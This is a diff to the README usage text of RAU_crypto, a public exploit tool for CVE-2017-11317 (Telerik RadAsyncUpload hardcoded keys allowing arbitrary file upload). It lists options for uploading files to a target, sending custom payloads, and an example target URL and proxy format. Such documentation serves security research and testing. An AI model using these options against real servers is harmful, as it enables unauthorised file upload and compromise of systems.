@@ -26,7 +26,7 @@ https://www.telerik.com/support/kb/aspnet-ajax/upload-%28async%29/details/insecu
 
 ## Usage
 ```
-$ ./RAU_crypto_py3.py 
+$ ./RAU_crypto.py 
 
 RAU_crypto by Paul Taylor / @bao7uo 
 CVE-2017-11317 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload
@@ -44,9 +44,11 @@ Upload file:                        -P c:\\destination\\folder Version c:\\local
 Generate custom payload POST data : -c partA partB
 Send custom payload:                -c partA partB url [proxy]
 
-Version in HTTP response:           -v url [proxy]
-
 Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
+Example Version format:    2016.2.504
+Example optional proxy:    127.0.0.1:8080
+
+N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS
 $
 ```
 ## Example - decryption
